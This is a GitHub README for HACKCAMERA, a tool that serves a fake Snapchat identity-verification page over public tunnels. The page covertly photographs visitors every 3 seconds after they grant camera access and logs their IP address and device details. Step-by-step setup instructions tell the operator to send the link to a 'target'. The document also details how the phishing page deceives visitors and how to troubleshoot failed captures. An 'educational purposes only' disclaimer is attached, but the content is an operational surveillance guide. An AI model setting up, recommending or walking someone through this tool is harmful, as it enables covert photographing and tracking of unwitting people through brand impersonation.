<p align="center"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=35&duration=3000&pause=1000&color=FFFC00&center=true&vCenter=true&width=600&lines=HACKCAMERA;Remote+Camera+Capture;Auto+Photo+Via+Link" alt="HACKCAMERA" /></p>
<p align="center"><img src="https://img.shields.io/badge/version-1.0-yellow?style=for-the-badge" /> <img src="https://img.shields.io/badge/python-3.8%2B-blue?style=for-the-badge&logo=python" /> <img src="https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20macos-lightgrey?style=for-the-badge" /> <img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge" /> <img src="https://img.shields.io/github/stars/thisnull7/hackcamera?style=social" /> <img src="https://img.shields.io/github/forks/thisnull7/hackcamera?style=social" /></p>

# HACKCAMERA

**HACKCAMERA** is a remote camera capture framework designed for educational security research. It generates a convincing Snapchat identity verification page that requests camera access from visitors. When permission is granted, photos are automatically captured every 3 seconds and sent to your machine in real-time. The tool includes a multi-tunnel system (Cloudflared, Serveo, localhost.run) to expose your local server publicly without port forwarding. **DISCLAIMER**: This tool is intended for educational purposes and authorized security testing only. The developer assumes no liability for misuse. Always obtain explicit consent before capturing any individual's photo.

## Preview
![HACKCAMERA Preview](https://raw.githubusercontent.com/thisnull7/hackcam/refs/heads/main/hekcam.png)

## Features
Auto Camera Capture takes photos every 3 seconds once the target grants camera permission. The landing page mimics Snapchat identity verification with yellow branding, ghost icon, warning badge, and live camera preview window. Device Fingerprinting captures user agent, platform, language, screen size, and timezone. Real-time Photo Delivery sends base64 JPEG images to your server instantly. Photos are saved locally with timestamped filenames in a dedicated captures folder. Metadata logging stores IP, device info, and capture timestamps in JSON format. Multi-Tunnel System uses Cloudflared as primary (no account needed, auto-download), with Serveo SSH and localhost.run as fallbacks. The landing page features a modern Glassmorphism UI with animated background orbs, pulse effects, and smooth transitions. The terminal interface has spinner animations, section headers, color-coded output, and real-time capture alerts. The tool runs on Windows, Linux, and macOS with no configuration needed.

## Prerequisites
Python 3.8+ must be installed on your Windows system. Download it from python.org. During installation, check the box that says "Add Python to PATH". Git is optional for cloning the repository. SSH client is optional for Serveo and localhost.run fallback tunnels. On Windows 10/11, enable OpenSSH Client in Settings → Apps → Optional Features. Internet connection is required for tunnel creation.

## How to Run on Windows CMD

**Step 1 — Open Command Prompt:** Press `Windows + R` on your keyboard, type `cmd`, and press Enter.

**Step 2 — Clone or Download the Tool:** If you have Git installed, clone the repository by typing `git clone https://github.com/thisnull7/hackcamera.git` and press Enter. If you don't have Git, download the ZIP file from GitHub, extract it to a folder like `C:\Users\YourName\Downloads\hackcamera`, then navigate to that folder in CMD by typing `cd C:\Users\YourName\Downloads\hackcamera` and pressing Enter.

**Step 3 — Navigate to the Folder:** Type `cd hackcamera` and press Enter. You should now be inside the hackcamera folder.

**Step 4 — Install Dependencies:** Type `pip install -r requirements.txt` and press Enter. This installs requests, colorama, and pyfiglet. Wait for the installation to complete. If you see red errors, try `python -m pip install -r requirements.txt` instead.

**Step 5 — Run the Tool:** Type `python cam.py` and press Enter. The tool will start. You will see the HACKCAMERA banner, initialization sequence, and tunnel connection attempts.

**Step 6 — Send the Link:** Once connected, a public URL will appear in yellow. Copy that link and send it to your target. The link will look like `https://xxxxx.trycloudflare.com` or similar.

**Step 7 — Wait for Captures:** When the target opens the link and clicks "Scan Face Now", their browser will ask for camera permission. Once granted, photos will be captured automatically every 3 seconds and saved to your `hackcamera_captures` folder.

**Step 8 — Stop the Tool:** Press `Ctrl+C` to stop. All photos are saved and will not be deleted.

## Tunnel Methods
The tool tries three tunnel methods automatically in sequence. Cloudflare Tunnel (method 1) uses `https://xxxxx.trycloudflare.com` format and requires nothing — the binary auto-downloads on first run. Serveo SSH (method 2) uses `https://xxxxx.serveo.net` format and requires SSH client installed. localhost.run (method 3) uses `https://xxxxx.lhr.life` format and also requires SSH client. If method 1 works, methods 2 and 3 are skipped. If method 1 fails, the tool automatically tries method 2, then method 3.

## Captured Data
Photos are saved as JPEG files in the `hackcamera_captures` folder with filenames like `capture_20260102_153045_1.jpg`. Metadata is stored in `hackcamera_captures/metadata.json` with the following structure: id (unique identifier from timestamp), timestamp (ISO format date and time), photo_file (the JPEG filename), ip (target's public IP address), device object containing ua (user agent string), platform (operating system), language (browser language), screen (resolution), and timezone (local timezone).

## Landing Page Details
The phishing page mimics Snapchat identity verification with a yellow gradient header strip, Snapchat ghost icon in black circle, warning badge with red pulsing dot saying "Camera Verification Needed", live camera preview window that shows the video feed once permission is granted, "Scan Face Now" yellow button with hover effects, loading spinner during camera access, success checkmark with "Identity Verified" message, error box with contextual messages if camera is denied, footer with "Privacy Protected" branding, and animated background orbs floating across a dark canvas. Photos are captured every 3 seconds automatically after the first successful capture at 1.5 seconds.

## File Structure
The repository contains cam.py (main tool script), requirements.txt (Python dependencies list), README.md (this documentation file), LICENSE (MIT License), and hackcamera_captures folder (auto-generated on first photo capture, contains JPEG files and metadata.json).

## Troubleshooting
If you see "Python is not recognized as an internal or external command", Python is not in your PATH — reinstall Python and check "Add Python to PATH" during installation. If you see "pip is not recognized", try `python -m pip install -r requirements.txt` instead. If all tunnels fail, check your internet connection and firewall settings. If Cloudflared download fails, download it manually from cloudflare/cloudflared releases on GitHub and place the exe file in `C:\Users\YourName\.hackcamera\`. If SSH is not found, install OpenSSH Client from Settings → Apps → Optional Features → Add a feature → OpenSSH Client. If port 8080 is already in use, change the PORT variable at the top of cam.py to another number like 8888. If no colors appear in CMD, install colorama with `pip install colorama` or ignore — functionality is unaffected. If the target denies camera access, the page shows a retry button — the target must manually allow camera in browser settings. If photos are black or blank, the target's camera may be covered or facing away — the front camera (facingMode: user) is requested by default. If you see ModuleNotFoundError, run `pip install -r requirements.txt` again.

## Author
**null7** — GitHub: [thisnull7](https://github.com/thisnull7). If you find this project useful, give it a star on GitHub. For issues or feature requests, open an issue on the repository.

## License
MIT License — see LICENSE file for details. Made for educational purposes only. Created by null7.

<p align="center"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=18&duration=2000&pause=1000&color=FFFC00&center=true&vCenter=true&width=400&lines=Made+for+educational+purposes+only;Created+by+null7" /></p>
